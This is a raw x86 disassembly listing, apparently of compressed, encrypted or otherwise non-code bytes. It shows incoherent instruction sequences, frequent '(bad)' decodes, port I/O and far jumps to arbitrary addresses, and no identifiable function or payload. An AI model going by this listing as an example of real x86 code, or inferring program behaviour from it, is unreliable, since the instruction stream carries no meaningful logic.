  42196e:	popf   
  42196f:	xor    edx,esi
  421971:	fwait
  421972:	or     eax,0xc4913b0e
  421977:	gs jnp 0x4219d0
  42197a:	push   ds
  42197b:	punpcklwd mm4,DWORD PTR [ecx]
  42197e:	mov    BYTE PTR [ebx],bl
  421980:	es in  eax,0x83
  421983:	popa   
  421984:	arpl   WORD PTR [edx-0x6c9ffed3],si
  42198a:	addr16 mov esi,0xd83d8e86
  421990:	add    DWORD PTR [eax],0x0
	...
  4219f2:	add    BYTE PTR [eax],al
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	stos   DWORD PTR es:[edi],eax
  421a01:	fstp   TBYTE PTR [ecx]
  421a03:	mov    WORD PTR [esi+0x5000166],?
  421a09:	add    DWORD PTR [eax],eax
  421a0b:	add    BYTE PTR [ecx],cl
  421a0d:	jg     0x421a47
  421a0f:	aad    0x9a
  421a11:	push   0x442d0f0d
  421a16:	push   es
  421a17:	push   cs
  421a18:	dec    edx
  421a19:	pop    ds
  421a1a:	dec    ebp
  421a1b:	std    
  421a1c:	jmp    0xe35f5718
  421a21:	data16 lahf 
  421a23:	das    
  421a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a25:	and    eax,0xecfa5e9a
  421a2a:	push   ebx
  421a2b:	cmp    BYTE PTR [ecx-0x1b5f73e5],al
  421a31:	sub    al,BYTE PTR [ebx-0x159442b9]
  421a37:	push   0xd0f7d89d
  421a3c:	push   ecx
  421a3d:	fsubr  st,st(3)
  421a3f:	add    bl,ch
  421a41:	in     eax,0x57
  421a43:	push   es
  421a44:	jae    0x421a9d
  421a46:	push   0x31
  421a48:	cmp    BYTE PTR [ebp-0x4],bh
  421a4b:	add    bh,bl
  421a4d:	inc    ecx
  421a4e:	xor    DWORD PTR [bp+si],ebp
  421a51:	and    DWORD PTR [edx+ebp*8+0x2aed0b3b],0xffffffac
  421a59:	cmp    ch,BYTE PTR [ebp+edx*1-0x26]
  421a5d:	jecxz  0x421abe
  421a5f:	cs mov ebx,0x64496017
  421a65:	mov    eax,ds:0xe6acbcbc
  421a6a:	sub    edi,ebx
  421a6c:	out    dx,al
  421a6d:	xchg   esi,eax
  421a6e:	div    DWORD PTR [eax+0x61]
  421a71:	or     BYTE PTR [edi],bl
  421a73:	inc    ecx
  421a74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a75:	int3   
  421a76:	ins    BYTE PTR es:[edi],dx
  421a77:	(bad)  
  421a79:	aas    
  421a7a:	stos   DWORD PTR es:[edi],eax
  421a7b:	xchg   ebp,eax
  421a7c:	rcr    DWORD PTR [ecx-0x7e],1
  421a7f:	mov    edi,0x8121dbd1
  421a84:	push   edx
  421a85:	into   
  421a86:	test   BYTE PTR [ebp+0x4f9b8681],ah
  421a8c:	fcomp  DWORD PTR [edi+0x1ba3805e]
  421a92:	mov    ecx,DWORD PTR [edx]
  421a94:	and    al,0x73
  421a96:	mov    WORD PTR [eax],es
  421a98:	add    dh,ah
  421a9a:	or     al,dh
  421a9c:	dec    eax
  421a9d:	push   edi
  421a9e:	and    bl,BYTE PTR [edx-0x3a6dbdae]
  421aa4:	lock into 
  421aa6:	mov    DWORD PTR [ecx],edi
  421aa8:	mov    eax,ds:0xfbe6fb4
  421aad:	jae    0x421ac1
  421aaf:	scas   eax,DWORD PTR es:[edi]
  421ab0:	and    al,0xc4
  421ab2:	loope  0x421b33
  421ab4:	(bad)  
  421ab5:	jb     0x421b32
  421ab7:	popa   
  421ab8:	push   ebp
  421ab9:	popa   
  421aba:	dec    ebx
  421abb:	cmp    DWORD PTR [esi-0x32],eax
  421abe:	(bad)  
  421abf:	mov    ch,BYTE PTR [ebp+0x3e]
  421ac2:	sbb    edx,DWORD PTR [ebx+ecx*8]
  421ac5:	cdq    
  421ac6:	ins    DWORD PTR es:[edi],dx
  421ac7:	sbb    al,0x7a
  421ac9:	retf   
  421aca:	xor    DWORD PTR [ecx],esi
  421acc:	jg     0x421b10
  421ace:	(bad)  
  421ad2:	test   BYTE PTR [esi],0x4a
  421ad5:	repz ret 
  421ad7:	and    DWORD PTR [ebx-0x6a5b7929],esp
  421add:	inc    eax
  421ade:	and    DWORD PTR [esi],esp
  421ae0:	cmp    DWORD PTR [ecx],eax
  421ae2:	out    dx,eax
  421ae3:	and    ch,BYTE PTR [ebx-0x108cf73d]
  421ae9:	loopne 0x421afc
  421aeb:	sub    eax,0x3d4d5002
  421af0:	jbe    0x421ab0
  421af2:	jmp    0x444605e3
  421af7:	push   es
  421af8:	lea    edx,[esi+0x7dadd14a]
  421afe:	ficomp WORD PTR [esi-0x9]
  421b01:	pop    esi
  421b02:	into   
  421b03:	js     0x421b03
  421b05:	mov    DWORD PTR [ecx],ebx
  421b07:	and    al,dh
  421b09:	rol    DWORD PTR [ebx+0x601370bc],cl
  421b0f:	(bad)  
  421b10:	pop    ds
	...
  421b71:	add    BYTE PTR [eax],al
  421b73:	add    BYTE PTR [esi],dl
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     al,BYTE PTR [ecx-0x4451d00d]
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    eax,0x9f000001
  421b8d:	sub    eax,0xb7cfebb0
  421b92:	pop    es
  421b93:	push   ebp
  421b94:	out    dx,al
  421b95:	repnz repnz and al,0x1a
  421b99:	mov    ah,0x3
  421b9b:	mov    bh,0xba
  421b9d:	mov    esp,0xcf6a8111
  421ba2:	retf   
  421ba3:	mov    ecx,0xce00e13a
  421ba8:	call   0x6422:0x32810046
  421baf:	(bad)  
  421bb0:	(bad)  
  421bb1:	data16 jo 0x421be3
  421bb4:	pop    edx
  421bb5:	add    eax,0xc931ad4
  421bba:	jg     0x421b66
  421bbc:	(bad)  
  421bbd:	jmp    0x421bdb
  421bbf:	mov    al,ds:0x5d20b377
  421bc4:	out    dx,al
  421bc5:	pop    edx
  421bc6:	fsub   QWORD PTR [edx-0x3cb4e777]
  421bcc:	push   0xffffff89
  421bce:	aaa    
  421bcf:	xchg   esi,eax
  421bd0:	lea    ebx,[ecx+0x1a62e081]
  421bd6:	add    DWORD PTR [si-0x121a],esi
  421bdb:	cdq    
  421bdc:	push   edi
  421bdd:	(bad)  
  421bde:	push   eax
  421bdf:	cmp    cl,BYTE PTR [edx]
  421be1:	mov    ebx,0x83f27432
  421be6:	scas   eax,DWORD PTR es:[edi]
  421be7:	test   eax,0x820bc94e
  421bec:	int    0x81
  421bee:	sbb    DWORD PTR [eax-0x3b],edi
  421bf1:	adc    al,0xee
  421bf3:	inc    ecx
  421bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bf5:	test   BYTE PTR [edi],dl
  421bf7:	addr16 mov es,esi
  421bfa:	jmp    0x421c2f
  421bfc:	inc    ebp
  421bfd:	les    edx,FWORD PTR [esi-0x4f79c51]
  421c03:	int3   
  421c04:	mov    DWORD PTR [edx-0x47],ebx
  421c07:	add    ebp,DWORD PTR [ebx-0x2d]
  421c0a:	sbb    BYTE PTR ss:[ebx],0x65
  421c0e:	test   BYTE PTR [eax],cl
  421c10:	loop   0x421c15
  421c12:	(bad)  
  421c13:	mov    ecx,0xdd39baed
  421c18:	enter  0x975f,0x26
  421c1c:	push   0x22
  421c1e:	aam    0x4f
  421c20:	mov    dl,0xa8
  421c22:	push   esi
  421c23:	inc    edi
  421c24:	loop   0x421c07
  421c26:	lods   al,BYTE PTR ds:[esi]
  421c27:	(bad)  
  421c28:	fild   DWORD PTR [edi]
  421c2a:	adc    ecx,ebx
  421c2c:	(bad)
  421c30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c31:	mov    edi,0x1604423f
  421c36:	mov    al,ah
  421c38:	nop
  421c39:	inc    edx
  421c3a:	add    eax,eax
  421c3c:	cmp    eax,0xf32d3fb7
  421c41:	and    eax,0xe8468b25
  421c46:	jo     0x421c6a
  421c48:	nop
  421c49:	aas    
  421c4a:	jb     0x421c4c
  421c4c:	xor    eax,esi
  421c4e:	dec    esp
  421c4f:	sub    ch,cl
  421c51:	mov    ah,0xb9
  421c53:	ret    
  421c54:	scas   eax,DWORD PTR es:[edi]
  421c55:	xchg   esi,eax
  421c56:	ds loop 0x421c34
  421c59:	pop    edx
  421c5a:	imul   DWORD PTR [ecx+esi*1+0x6d]
  421c5e:	fcomp  DWORD PTR [edi-0x3bafefd1]
  421c64:	pop    ecx
  421c65:	into   
  421c66:	lods   al,BYTE PTR ds:[esi]
  421c67:	icebp  
  421c68:	xor    eax,0xc84ffea6
  421c6d:	and    ah,BYTE PTR [eax+edi*2-0x5]
  421c71:	mov    bl,0xa5
  421c73:	daa    
  421c74:	jecxz  0x421cb9
  421c76:	add    esi,DWORD PTR [edx-0x24678b31]
  421c7c:	cs xchg esi,eax
  421c7e:	add    ebx,DWORD PTR [edi]
  421c80:	es retf 
  421c82:	out    dx,al
  421c83:	jge    0x421c2a
  421c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c86:	and    BYTE PTR [eax-0x52],cl
  421c89:	scas   al,BYTE PTR es:[edi]
  421c8a:	dec    edi
  421c8b:	mov    dl,0xce
  421c8d:	ins    BYTE PTR es:[edi],dx
  421c8e:	rol    BYTE PTR [edx+0x45],1
	...
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	shl    BYTE PTR ds:0x68c0c29a,cl
  421d06:	add    DWORD PTR [eax],eax
  421d08:	add    eax,0xf000001
  421d0d:	cmp    esp,ebx
  421d0f:	loopne 0x421d40
  421d11:	cmp    ch,bh
  421d13:	(bad)  
  421d14:	mov    esp,0x400b54ed
  421d19:	mov    dh,0x9e
  421d1b:	mov    dh,0x30
  421d1d:	imul   ebp,ecx,0xffffff97
  421d20:	xor    BYTE PTR [eax-0x2f],ah
  421d23:	retf   
  421d24:	out    dx,al
  421d25:	pop    esp
  421d26:	call   0x1027:0xdb6e0a9a
  421d2d:	cmp    ebx,edi
  421d2f:	cli    
  421d30:	daa    
  421d31:	std    
  421d32:	add    al,0xa3
  421d34:	std    
  421d35:	test   eax,0x6531ad07
  421d3a:	mov    WORD PTR [ebx-0x2adb5c72],ds
  421d40:	push   ecx
  421d41:	push   eax
  421d42:	outs   dx,DWORD PTR ds:[esi]
  421d43:	pop    esp
  421d44:	mov    ch,0x3a
  421d46:	or     ah,0xd0
  421d49:	lea    esp,[ecx]
  421d4b:	pusha  
  421d4c:	mov    ds,WORD PTR [eax]
  421d4e:	fldenv [edx]
  421d50:	pop    ebx
  421d51:	not    DWORD PTR [esi+0x6af628bc]
  421d57:	cmp    BYTE PTR [esi-0x65eb2766],cl
  421d5d:	and    eax,DWORD PTR [ecx-0x14]
  421d60:	xchg   esi,eax
  421d61:	jo     0x421d38
  421d63:	hlt    
  421d64:	sub    BYTE PTR [ecx+eax*1+0x28],dl
  421d68:	test   ch,bl
  421d6a:	or     ecx,eax
  421d6c:	mov    ebp,esi
  421d6e:	xlat   BYTE PTR ds:[ebx]
  421d6f:	scas   eax,DWORD PTR es:[edi]
  421d70:	fbld   TBYTE PTR [edi*1-0x6dd57f4e]
  421d77:	xchg   ebp,eax
  421d78:	test   DWORD PTR [ebp+0x472c975d],0x56134670
  421d82:	stos   DWORD PTR es:[edi],eax
  421d83:	ret    0x3ac
  421d86:	adc    eax,DWORD PTR [edi-0x654323bf]
  421d8c:	push   ecx
  421d8d:	cwde   
  421d8e:	cs push 0x2
  421d91:	std    
  421d92:	mov    edi,0x87e2156d
  421d97:	push   edx
  421d98:	(bad)  
  421d9a:	icebp  
  421d9b:	sbb    eax,0x2dd2c412
  421da0:	dec    ebp
  421da1:	cli    
  421da2:	call   0x8dab:0xec5ac8d3
  421da9:	xchg   edx,eax
  421daa:	xchg   esi,eax
  421dab:	gs ror edx,cl
  421dae:	sbb    eax,0x27aa7732
  421db3:	push   eax
  421db4:	hlt    
  421db5:	xchg   edi,eax
  421db6:	nop
  421db7:	sbb    bl,BYTE PTR ds:0xe9628566
  421dbd:	or     BYTE PTR [edi+0x239ddab4],al
  421dc3:	jmp    0x7895:0x61d7f6db
  421dca:	sbb    edx,DWORD PTR [ebp+0xb]
  421dcd:	pop    ebp
  421dce:	out    0x38,eax
  421dd0:	xor    eax,0xdd72a609
  421dd5:	ret    0xa1c0
  421dd8:	jo     0x421dc0
  421dda:	jge    0x421d70
  421ddc:	adc    DWORD PTR [ecx],0x10ab1c68
  421de2:	push   0xcc3b29ea
  421de7:	imul   edx,DWORD PTR ds:0xad01794d,0xc8464550
  421df1:	mov    ds:0x8d6683bb,al
  421df6:	or     BYTE PTR [ecx-0x725e930],ch
  421dfc:	cmp    al,0xda
  421dfe:	pop    edx
  421dff:	imul   ecx,DWORD PTR [eax+0x49c2abd2],0xcdb295bb
  421e09:	neg    edx
  421e0b:	daa    
  421e0c:	xchg   ebx,eax
  421e0d:	sti    
  421e0e:	add    eax,0xe976
	...
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	iret   
  421e81:	and    DWORD PTR [ebx+0x169c525],ecx
  421e87:	add    BYTE PTR ds:0xea000001,al
  421e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e8e:	push   cs
  421e8f:	jbe    0x421eca
  421e91:	into   
  421e92:	xor    eax,0x4c3c911c
  421e97:	fisubr WORD PTR [eax*2-0x6e9ebf7f]
  421e9e:	push   ecx
  421e9f:	test   DWORD PTR [eax],edx
  421ea1:	ins    DWORD PTR es:[edi],dx
  421ea2:	adc    eax,0xf04c30d7
  421ea7:	and    BYTE PTR [esi+0x4e981aab],cl
  421ead:	sub    BYTE PTR [edx+0x22],bh
  421eb0:	cmp    eax,0x95b83a5e
  421eb5:	xor    DWORD PTR ds:0x8209a459,0xffffffa8
  421ebc:	jcxz   0x421eb1
  421ebf:	out    0x2,al
  421ec1:	lods   eax,DWORD PTR ds:[esi]
  421ec2:	xlat   BYTE PTR ds:[ebx]
  421ec3:	mov    esp,0xff7dd0e
  421ec8:	xor    eax,0x39ed9e68
  421ecd:	scas   eax,DWORD PTR es:[edi]
  421ece:	dec    ebp
  421ecf:	in     al,0x24
  421ed1:	test   ebp,esi
  421ed3:	in     al,0x1b
  421ed5:	or     ah,ah
  421ed7:	xchg   edi,eax
  421ed8:	inc    eax
  421ed9:	and    eax,0x61c23675
  421ede:	mov    esi,0xdee66455
  421ee3:	push   es
  421ee4:	hlt    
  421ee5:	inc    ebp
  421ee6:	mov    cl,0x5a
  421ee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ee9:	xchg   esi,eax
  421eea:	mov    ah,BYTE PTR [esi+esi*4-0x25654738]
  421ef1:	std    
  421ef2:	xor    edi,DWORD PTR [edx]
  421ef4:	das    
  421ef5:	and    al,0xee
  421ef7:	ror    DWORD PTR [ebx-0x2b0bad44],1
  421efd:	cmp    BYTE PTR [ebp+0x1e],ch
  421f00:	arpl   WORD PTR ds:0xaa69a0cf,dx
  421f06:	retf   
  421f07:	das    
  421f08:	mov    al,bl
  421f0a:	push   esi
  421f0b:	add    al,0xe7
  421f0d:	mov    ebp,0xeed39130
  421f12:	jl     0x421ec7
  421f14:	neg    WORD PTR [edx-0x53]
  421f18:	pop    eax
  421f19:	into   
  421f1a:	into   
  421f1b:	mov    ch,0xe1
  421f1d:	hlt    
  421f1e:	sahf   
  421f1f:	jmp    0x421ecc
  421f21:	lds    esi,FWORD PTR [ecx-0x62]
  421f24:	mov    BYTE PTR [esi-0x5c],dl
  421f27:	pop    esp
  421f28:	jle    0x421f90
  421f2a:	repz pop ecx
  421f2c:	popf   
  421f2d:	xlat   BYTE PTR ds:[ebx]
  421f2e:	or     esi,ecx
  421f30:	pop    edi
  421f31:	pusha  
  421f32:	ss pusha 
  421f34:	push   cs
  421f35:	jbe    0x421f03
  421f37:	test   BYTE PTR [ecx+0x5a],0x9c
  421f3b:	inc    edx
  421f3c:	mov    esi,0x95311666
  421f41:	out    0xc6,eax
  421f43:	call   0x49a4:0xc25de8d2
  421f4a:	mov    eax,0x31a2bf6b
  421f4f:	mov    WORD PTR [ecx+0x4cff2834],ss
  421f55:	pop    eax
  421f56:	inc    ebp
  421f57:	add    eax,0xc56cc3ab
  421f5c:	push   cs
  421f5d:	xchg   ebp,eax
  421f5e:	test   BYTE PTR [ebx-0x7d821898],al
  421f64:	add    dh,BYTE PTR [ebx+edi*4+0x28]
  421f68:	push   esp
  421f69:	jp     0x421f4e
  421f6b:	es xchg esp,eax
  421f6d:	pop    esi
  421f6e:	imul   ecx,DWORD PTR [ebp-0x589cfe94],0x4c95532c
  421f78:	jae    0x421f55
  421f7a:	xor    eax,0x5a9ca1a1
  421f7f:	or     al,0xec
  421f81:	xchg   ebp,eax
  421f82:	stos   DWORD PTR es:[edi],eax
  421f83:	loopne 0x421f90
  421f85:	das    
  421f86:	pop    esi
  421f87:	sar    BYTE PTR [edi+ebp*8-0x3aff7171],cl
  421f8e:	test   BYTE PTR [ebp+0x38],bh
	...
  421ff4:	imul   eax,DWORD PTR [esi],0xffffff8f
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 es (bad) 
  422002:	pop    esi
  422003:	inc    esp
  422004:	retf   0x16a
  422007:	add    BYTE PTR ds:0x66000001,al
  42200d:	scas   al,BYTE PTR es:[edi]
  42200e:	fld    QWORD PTR ds:0xaf973f0b
  422014:	or     DWORD PTR [esi],esp
  422016:	cmp    esi,DWORD PTR [esi]
  422018:	sahf   
  422019:	sbb    al,0xc9
  42201b:	cmp    al,0x64
  42201d:	cdq    
  42201e:	aaa    
  42201f:	mov    ch,0x6b
  422021:	dec    esp
  422022:	lea    esp,[esi]
  422024:	pushf  
  422025:	mov    cs,esp
  422027:	dec    edx
  422028:	hlt    
  422029:	in     eax,0x3e
  42202b:	add    al,0x85
  42202d:	nop
  42202e:	repnz ror BYTE PTR [edi-0x7a5c84d8],1
  422035:	loopne 0x421ffe
  422037:	loopne 0x4220b7
  422039:	pop    ecx
  42203a:	add    dh,BYTE PTR ds:[ecx-0x28]
  42203e:	gs sub al,0xae
  422041:	jle    0x421ff7
  422043:	cmp    ebp,eax
  422045:	sbb    ebx,ebp
  422047:	dec    ebp
  422048:	retf   0xbfa1
  42204b:	mov    cl,0x3
  42204d:	xlat   BYTE PTR ds:[ebx]
  42204e:	ins    DWORD PTR es:[edi],dx
  42204f:	cmc    
  422050:	mov    ah,bh
  422052:	into   
  422053:	mov    eax,0x7afd439b
  422058:	cmp    ecx,DWORD PTR [esi]
  42205a:	and    bh,BYTE PTR [eax+0x2d]
  42205d:	add    eax,DWORD PTR [ebp+0x19]
  422060:	aad    0x66
  422062:	dec    edi
  422063:	xchg   edx,eax
  422064:	stos   DWORD PTR es:[edi],eax
  422065:	stos   DWORD PTR es:[edi],eax
  422066:	lods   al,BYTE PTR ds:[esi]
  422067:	sbb    dh,BYTE PTR [edi]
  422069:	sub    al,0xcb
  42206b:	cmp    al,0x6f
  42206d:	pop    edx
  42206e:	mov    ds:0xb45f3f9b,eax
  422073:	and    DWORD PTR [ebp+0x18],ecx
  422076:	nop
  422077:	dec    ebp
  422078:	inc    edi
  422079:	pushf  
  42207a:	cmp    al,0xeb
  42207c:	stc    
  42207d:	sub    edx,esi
  42207f:	icebp  
  422080:	aam    0xcc
  422082:	jle    0x4220f9
  422084:	retf   0x5d4c
  422087:	cmp    DWORD PTR [esi+0x2b],esi
  42208a:	outs   dx,BYTE PTR ds:[esi]
  42208b:	inc    ecx
  42208c:	js     0x4220cc
  42208e:	mov    edi,0xc4d96222
  422093:	jmp    0xb780:0x9582fc78
  42209a:	pop    esi
  42209b:	and    dh,BYTE PTR [ecx]
  42209d:	imul   ecx,ebx,0x1c0801e3
  4220a3:	(bad)  
  4220a4:	dec    esi
  4220a5:	add    eax,0x6a054fb2
  4220aa:	inc    ebx
  4220ab:	dec    ebp
  4220ac:	ja     0x422099
  4220ae:	pop    ebx
  4220af:	mul    BYTE PTR [ebp-0x49]
  4220b2:	mov    DWORD PTR [eax+esi*2-0x4f254c],eax
  4220b9:	jb     0x422072
  4220bb:	outs   dx,BYTE PTR ds:[esi]
  4220bc:	jbe    0x4220af
  4220be:	push   ebp
  4220bf:	adc    BYTE PTR [ebp+0x16],cl
  4220c2:	push   ss
  4220c3:	in     eax,0x19
  4220c5:	loop   0x422115
  4220c7:	leave  
  4220c8:	mov    DWORD PTR [ebp+0x1d],eax
  4220cb:	push   ebp
  4220cc:	and    BYTE PTR [edi],cl
  4220ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220cf:	mov    eax,ds:0xba579d08
  4220d4:	lds    ecx,FWORD PTR [ebx+0x11]
  4220d7:	inc    ecx
  4220d8:	sub    BYTE PTR [edx-0x2e0931a3],dh
  4220de:	and    esi,DWORD PTR [edi+eax*1+0x52cdce1f]
  4220e5:	(bad)  
  4220e6:	in     al,0xd4
  4220e8:	adc    esi,DWORD PTR [ebx-0x3fcd720]
  4220ee:	pop    es
  4220ef:	aas    
  4220f0:	outs   dx,BYTE PTR ds:[esi]
  4220f1:	cmp    al,0xed
  4220f3:	outs   dx,DWORD PTR ds:[esi]
  4220f4:	retf   0x752c
  4220f7:	or     ch,cl
  4220f9:	xor    esi,DWORD PTR [esi+0x15]
  4220fc:	(bad)  
  4220fd:	mov    ah,0xa9
  4220ff:	jle    0x4220cb
  422101:	xchg   edi,eax
  422102:	(bad)  
  422103:	xlat   BYTE PTR ds:[ebx]
  422104:	xchg   edi,eax
  422105:	sahf   
  422106:	add    eax,0xc395c472
  42210b:	push   0x58
  42210d:	cmc    
  42210e:	fst    st(4)
  422110:	data16 add BYTE PTR [eax],al
	...
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ebx,DWORD PTR [ebx-0x72]
  422182:	stos   DWORD PTR es:[edi],eax
  422183:	into   
  422184:	iret   
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    eax,0x29000001
  42218d:	outs   dx,DWORD PTR ds:[esi]
  42218e:	push   esi
  42218f:	adc    al,0x56
  422191:	retf   
  422192:	ror    DWORD PTR [ebp+0x243b0acc],0x4
  422199:	retf   0xaeea
  42219c:	add    BYTE PTR [eax-0x62],0x91
  4221a0:	or     DWORD PTR [ebx+0x6c13c755],ebp
  4221a6:	push   cs
  4221a7:	pop    ebx
  4221a8:	aas    
  4221a9:	and    DWORD PTR [eax-0x61],ebp
  4221ac:	mul    BYTE PTR [esi-0x1f65cc29]
  4221b2:	adc    al,0x97
  4221b4:	jg     0x42213c
  4221b6:	adc    ch,cl
  4221b8:	push   edi
  4221b9:	test   DWORD PTR ss:[esi-0x3541906a],0x3e9b1c0b
  4221c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221c5:	pop    ecx
  4221c6:	adc    BYTE PTR [edx-0x3fa22f6b],ch
  4221cc:	js     0x422170
  4221ce:	push   edx
  4221cf:	push   ebp
  4221d0:	call   FWORD PTR [ebx]
  4221d2:	outs   dx,BYTE PTR ds:[esi]
  4221d3:	xchg   ebx,eax
  4221d4:	adc    al,bl
  4221d6:	pop    es
  4221d7:	(bad)
  4221db:	in     al,0xa5
  4221dd:	push   ecx
  4221de:	ss add al,0xc3
  4221e1:	cli    
  4221e2:	adc    al,0xb1
  4221e4:	out    0x47,al
  4221e6:	daa    
  4221e7:	loop   0x422235
  4221e9:	dec    esi
  4221ea:	mov    dl,0x12
  4221ec:	push   ebp
  4221ed:	or     eax,0xa4c8d446
  4221f2:	shl    BYTE PTR [ecx+0x1d1e8e94],0x17
  4221f9:	mov    cl,0xad
  4221fb:	lock cwde 
  4221fd:	ret    0x28d9
  422200:	mov    ecx,0x37f03d88
  422205:	dec    eax
  422206:	jae    0x42227c
  422208:	jno    0x4221d6
  42220a:	pop    ebp
  42220b:	scas   eax,DWORD PTR es:[edi]
  42220c:	pop    ebp
  42220d:	pushf  
  42220e:	and    al,0x18
  422210:	dec    eax
  422211:	xor    BYTE PTR [edx-0x5375743e],0x8e
  422218:	push   ebp
  422219:	test   al,0x3a
  42221b:	mov    edi,0x6f12a6d1
  422220:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422222:	inc    esi
  422223:	and    BYTE PTR [esi-0x8],bl
  422226:	mov    ds:0x29747fae,eax
  42222b:	scas   al,BYTE PTR es:[edi]
  42222c:	mov    dh,0xd6
  42222e:	jb     0x422215
  422230:	scas   al,BYTE PTR es:[edi]
  422231:	sub    ebp,DWORD PTR [ecx+0x25]
  422234:	xor    edx,DWORD PTR [ebp-0x680a2337]
  42223a:	test   DWORD PTR [ebx+0x4e],0x3b7d0d29
  422241:	xchg   ecx,eax
  422242:	mov    ds:0xdd53f625,eax
  422247:	pusha  
  422248:	adc    bh,BYTE PTR [eax+eax*8+0x7f]
  42224c:	push   ebx
  42224d:	mov    ecx,0x5aea7dbd
  422252:	outs   dx,DWORD PTR ds:[esi]
  422253:	xchg   DWORD PTR gs:[ebp+0x3a75890a],ebx
  42225a:	es add al,0xc9
  42225d:	aad    0xd2
  42225f:	inc    ecx
  422260:	jns    0x422292
  422262:	das    
  422263:	arpl   WORD PTR [ebp+0x34],dx
  422266:	and    al,0xd7
  422268:	and    BYTE PTR [edi+edi*8],0x6e
  42226c:	mov    edx,0xf219953f
  422271:	sbb    eax,0x20d8e63a
  422276:	or     BYTE PTR [ecx+0x6c],0x11
  42227a:	mov    si,0x3e8b
  42227e:	xor    DWORD PTR [esi],edi
  422280:	mov    bh,0x1a
  422282:	js     0x422226
  422284:	clc    
  422285:	fwait
  422286:	add    DWORD PTR [ebp+edx*1-0x61],edi
  42228a:	les    ebp,FWORD PTR [edi+ecx*1+0x57f76362]
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	aas    
  422301:	xchg   ebx,eax
  422302:	loope  0x422365
  422304:	aam    0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    eax,0x31000001
  42230d:	outs   dx,BYTE PTR ds:[esi]
  42230e:	out    dx,al
  42230f:	xchg   esi,eax
  422310:	cmp    DWORD PTR [eax-0xd642920],ecx
  422316:	mov    dl,0x7a
  422318:	and    al,0x5a
  42231a:	jns    0x422392
  42231c:	jne    0x42238e
  42231e:	repnz enter 0xf479,0x73
  422323:	xchg   esi,eax
  422324:	(bad)  [ebp-0x59e22541]
  42232a:	hlt    
  42232b:	cmp    dl,dl
  42232d:	cdq    
  42232e:	inc    ebp
  42232f:	sbb    ecx,eax
  422331:	sbb    eax,0x11cd7e24
  422336:	cmp    BYTE PTR [edx-0xc4efe57],0x88
  42233d:	jb     0x4223a6
  42233f:	sbb    al,0xaa
  422341:	xor    al,0xfc
  422343:	jl     0x422344
  422345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422346:	xor    edi,ebx
  422348:	dec    edi
  422349:	in     eax,dx
  42234a:	js     0x4222fd
  42234c:	addr16 out 0x89,al
  42234f:	xor    esi,esp
  422351:	je     0x422326
  422353:	pop    ss
  422354:	scas   al,BYTE PTR es:[edi]
  422355:	int    0xaa
  422357:	jns    0x42231b
  422359:	out    0x68,al
  42235b:	popf   
  42235c:	data16 mov ch,0x50
  42235f:	mov    ecx,0xeff42a9d
  422364:	(bad)  
  422365:	jae    0x422316
  422367:	pop    ebp
  422368:	out    dx,eax
  422369:	pop    ecx
  42236a:	mov    cl,0x1
  42236c:	(bad)  
  42236d:	das    
  42236e:	gs aas 
  422370:	lds    esi,FWORD PTR [esi+0x72]
  422373:	out    0x50,al
  422375:	adc    ah,BYTE PTR [edi-0x3c]
  422378:	cs jmp 0x422300
  42237b:	sbb    ch,BYTE PTR [ebx+0x72]
  42237e:	in     eax,dx
  42237f:	jl     0x422356
  422381:	rep stos DWORD PTR es:[edi],eax
  422383:	mov    ebx,0x17af051
  422388:	jne    0x4223e3
  42238a:	push   es
  42238b:	mov    dl,0x1f
  42238d:	repz inc edx
  42238f:	cmp    DWORD PTR [edi+0x31df6411],edx
  422395:	sar    DWORD PTR [edx+0xd],0x9d
  422399:	cli    
  42239a:	xor    al,0xed
  42239c:	dec    ebp
  42239d:	add    DWORD PTR [ebx+0x1c69436c],ebp
  4223a3:	call   0x2f813122
  4223a8:	add    BYTE PTR [ecx],bl
  4223aa:	hlt    
  4223ab:	dec    edi
  4223ac:	mov    WORD PTR [edx+0x50edd663],cs
  4223b2:	mov    fs,WORD PTR [eax+0x65]
  4223b5:	push   cs
  4223b6:	xchg   ebp,eax
  4223b7:	mov    BYTE PTR [esi-0xe],dl
  4223ba:	xlat   BYTE PTR ds:[ebx]
  4223bb:	test   eax,0xf7d78ecc
  4223c0:	sub    esp,esi
